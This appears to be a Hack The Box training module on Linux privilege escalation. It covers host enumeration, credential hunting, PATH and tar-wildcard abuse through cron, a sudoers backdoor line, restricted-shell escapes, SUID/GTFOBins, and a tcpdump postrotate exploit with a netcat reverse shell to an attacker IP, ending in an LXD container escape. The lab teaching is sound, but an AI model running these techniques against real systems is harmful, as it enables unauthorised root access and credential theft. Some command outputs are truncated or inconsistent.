# Environment Enumeration
Enumeration is the key to privilege escalation. Several helper scripts (such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.

We'll start out by checking out what operating system and version we are dealing with.

```shell-session
Poiint@htb[/htb]$ cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
We can see that the target is running [Ubuntu 20.04.4 LTS ("Focal Fossa")](https://releases.ubuntu.com/20.04/). For whatever version we encounter its important to see if we're dealing with something out-of-date or maintained


Next we'll want to check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type, i.e., `id` which on this system is located at `/usr/bin/id`. As we'll see later in this module, if the PATH variable for a target user is misconfigured we may be able to leverage it to escalate privileges. For now we'll note it down and add it to our notetaking tool of choice.

```shell-session
Poiint@htb[/htb]$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.

```shell-session
Poiint@htb[/htb]$ env

SHELL=/bin/bash
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=en_US.UTF-8

<SNIP>
```

Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be `cat /proc/version` but we'll use the `uname -a` command.

```shell-session
Poiint@htb[/htb]$ uname -a

Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

We can next gather some additional information about the host itself such as the CPU type/version:

```shell-session
Poiint@htb[/htb]$ lscpu 

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
<SNIP>
```

What login shells exist on the server? Note these down and highlight that both Tmux and Screen are availble to us.

```shell-session
Poiint@htb[/htb]$ cat /etc/shells

# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen
```

We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:

- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

Next we can take a look at the drives and any shares on the system. First, we can use the `lsblk` command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

```shell-session
Poiint@htb[/htb]$ lsblk

NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   55M  1 loop /snap/core18/1705
loop1                       7:1    0   69M  1 loop /snap/lxd/14804
loop2                       7:2    0   47M  1 loop /snap/snapd/16292
loop3                       7:3    0  103M  1 loop /snap/lxd/23339
loop4                       7:4    0   62M  1 loop /snap/core20/1587
loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
<SNIP>
```

We should also checked for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in `fstab` for mounted drives by grepping for common words such as password, username, credential, etc in `/etc/fstab`?

```shell-session
Poiint@htb[/htb]$ cat /etc/fstab

# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
# /boot was on /dev/sda2 during curtin installation
/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0
```

Check out the routing table by typing `route` or `netstat -rn`. Here we can see what other networks are available via which interface.

```shell-session
Poiint@htb[/htb]$ route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         _gateway        0.0.0.0         UG    0      0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
```

In a domain environment we'll definitely want to check `/etc/resolv.conf` if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

We'll also want to check the arp table to see what other hosts the target has been communicating with.

```shell-session
Poiint@htb[/htb]$ arp -a

_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192
```

Existing Users

```shell-session
Poiint@htb[/htb]$ cat /etc/passwd
```

With Linux, several different hash algorithms can be used to make the passwords unrecognizable. Identifying them from the first hash blocks can help us to use and work with them later if needed. Here is a list of the most used ones:

|**Algorithm**|**Hash**|
|---|---|
|Salted MD5|`$1$`...|
|SHA-256|`$5$`...|
|SHA-512|`$6$`...|
|BCrypt|`$2a$`...|
|Scrypt|`$7$`...|
|Argon2|`$argon2i$`...|

We'll also want to check which users have login shells. Once we see what shells are on the system, we can check each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a `shellshock` exploit.

```shell-session
Poiint@htb[/htb]$ grep "*sh$" /etc/passwd
```

Existing Groups

```shell-session
Poiint@htb[/htb]$ cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,htb-student
tty:x:5:syslog
<SNIP>
```

The `/etc/group` file lists all of the groups on the system. We can then use the [getent](https://man7.org/linux/man-pages/man1/getent.1.html) command to list members of any interesting groups.

```shell-session
Poiint@htb[/htb]$ getent group sudo

sudo:x:27:mrb3n
```

We can also check out which users have a folder under the `/home` directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We should check to see if files such as the `.bash_history` file are readable and contain any interesting commands and look for configuration files

```shell-session
Poiint@htb[/htb]$ ls /home

administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
backupsvc                cliff.moore  logger       shared
```

Mounted File Systems

```shell-session
Poiint@htb[/htb]$ df -h

Filesystem      Size  Used Avail Use% Mounted on
udev            1,9G     0  1,9G   0% /dev
tmpfs           389M  1,8M  388M   1% /run
/dev/sda5        20G  7,9G   11G  44% /
<SNIP>
```

Unmounted File Systems

```shell-session
Poiint@htb[/htb]$ cat /etc/fstab | grep -v "#" | column -t

UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
/swapfile                                  none       swap  sw                 0  0
```

All Hidden Files

```shell-session
Poiint@htb[/htb]$ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

All Hidden Directories

```shell-session
Poiint@htb[/htb]$ find / -type d -name ".*" -ls 2>/dev/null
```

In addition, all temporary files stored in the `/tmp` directory are deleted immediately when the system is restarted. Therefore, the `/var/tmp` directory is used by programs to store data that must be kept between reboots temporarily.

Temporary Files

```shell-session
Poiint@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm
```
# Linux Services & Internals Enumerations

When we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. So we start with the interfaces through which our target system can communicate.

Network Interfaces

```shell-session
Poiint@htb[/htb]$ ip a
```

Is there anything interesting in the `/etc/hosts` file?

Hosts

```shell-session
Poiint@htb[/htb]$ cat /etc/hosts

127.0.0.1 localhost
127.0.1.1 nixlpe02
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

It can also be helpful to check out each user's last login time to try to see when users typically log in to the system and how frequently.

User's Last Login

```shell-session
Poiint@htb[/htb]$ lastlog

Username         Port     From             Latest
root                                       **Never logged in**
daemon                                     **Never logged in**
bin                                        **Never logged in**
<SNIP>
```

In addition, let's see if anyone else is currently on the system with us. There are a few ways to do this, such as the `who` command. The `finger` command will work to display this information on some Linux systems. We can see that the `cliff.moore` user is logged in to the system with us.

```shell-session
Poiint@htb[/htb]$ w

 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

It is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more

Command History

```shell-session
Poiint@htb[/htb]$ history

    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

Finding History Files

```shell-session
Poiint@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
```

Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks

Cron

```shell-session
Poiint@htb[/htb]$ ls -la /etc/cron.daily/

total 48

The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings

Proc

```shell-session
Poiint@htb[/htb]$ find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

...SNIP...
startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:

```


If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability

Installed Packages

```shell-session
Poiint@htb[/htb]$ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

Listing...                                                 
accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          
accountsservice 0.6.55-0ubuntu12~20.04.5                   
acl 2.2.53-6                                               
acpi-support 0.143
<SNIP>
```

It's also a good idea to check if the `sudo` version installed on the system is vulnerable to any legacy or recent exploits.

Sudo Version

```shell-session
Poiint@htb[/htb]$ sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Occasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries. These do not require installation and can be executed directly by the system itself.

Binaries

```shell-session
Poiint@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -> usr/bin

/usr/bin/:

```

[GTFObins](https://gtfobins.github.io) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.

GTFObins

```shell-session
Poiint@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

We can use the diagnostic tool `strace` on Linux-based operating systems to track and analyze system calls and signal processing

In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.

The output of `strace` can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.

Trace System Calls

```shell-session
Poiint@htb[/htb]$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0

```

Users can read almost all configuration files on a Linux operating system if the administrator has kept them the same. These configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes.

Configuration Files

```shell-session
Poiint@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf
-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf
-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf
-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf
-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf
...SNIP...
```

The scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems.

Scripts

```shell-session
Poiint@htb[/htb]$ find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/home/htb-student/automation.sh
/etc/wpa_supplicant/action_wpa.sh
/etc/wpa_supplicant/ifupdown.sh
/etc/wpa_supplicant/functions.sh
/etc/init.d/keyboard-setup.sh
/etc/init.d/console-setup.sh
/etc/init.d/hwclock.sh
...SNIP...
```

Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the `root` directory.

Running Services by User

```shell-session
Poiint@htb[/htb]$ ps aux | grep root

...SNIP...

# Credential Hunting

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

```shell-session
htb_student@NIX02:~$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

```shell-session
htb_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
/boot/grub/i386-pc/configfile.mod
/sys/devices/pci0000:00/0000:00:00.0/config
/sys/devices/pci0000:00/0000:00:01.0/config
<SNIP>
```

It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the `known_hosts` file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

```shell-session
htb_student@NIX02:~$  ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```

# Path Abuse

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat /tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add `.` to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```

# Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

|**Character**|**Significance**|
|---|---|
|`*`|An asterisk that can match any number of characters in a file name.|
|`?`|Matches a single character.|
|`[ ]`|Brackets enclose characters and can match any single one at the defined position.|
|`~`|A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.|
|`-`|A hyphen within brackets will denote a range of characters.|

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the [man page](http://man7.org/linux/man-pages/man1/tar.1.html) for the `tar` command, we see the following:

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/home/htb-student` directory's contents and create a compressed archive within `/home/htb-student`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

We can check and see that the necessary files were created.

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```



# Escaping Restricted Shells

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directoriesSome common examples of restricted shells include the `rbash` shell in Linux and the "Restricted-access Shell" in Windows

#### RBASH

[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.

#### RKSH

[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter. The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.

#### RZSH

[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.

Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the `ls` command. Unfortunately, the shell only allows us to execute the `ls` command with a specific set of arguments, such as `ls -l` or `ls -a`, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the `ls` command.

For example, we could use the following command to inject a `pwd` command into the argument of the `ls` command:

Command injection

```shell-session
Poiint@htb[/htb]$ ls -l `pwd` 
```

This command would cause the `ls` command to be executed with the argument `-l`, followed by the output of the `pwd` command. Since the `pwd` command is not restricted by the shell, this would allow us to execute the `pwd` command and see the current working directory, even though the shell does not allow us to execute the `pwd` command directly

#### Command Substitution

Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.

#### Command Chaining

In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (`;`) or a vertical bar (`|`), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.

#### Environment Variables

For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory


# Special Permissions

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`.

```shell-session
Poiint@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
<SNIP>
```

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the `setuid` bit is set on them, these can be used for our purpose.

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: `find / -uid 0 -perm -6000 -type f 2>/dev/null`. These files can be leveraged in the same manner as `setuid` binaries to escalate privileges.

```shell-session
Poiint@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
```

This [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the `setuid` and `setgid` bits, including how to set the bits.
## GTFOBins

The [GTFOBins](https://gtfobins.github.io) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, `apt-get` can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:

```shell-session
Poiint@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

It is worth familiarizing ourselves with as many GTFOBins as possible to quickly identify misconfigurations when we land on a system that we must escalate our privileges to move further.

# Sudo Rights Abuse 

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in **/etc/sudoers**. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command 
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Next, start a `netcat` listener on our attacking box run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

We receive a root shell almost instantly.

```shell-session
Poiint@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`,effectively preventing command execution.


# Privileged Groups

## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Mount the host file system.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

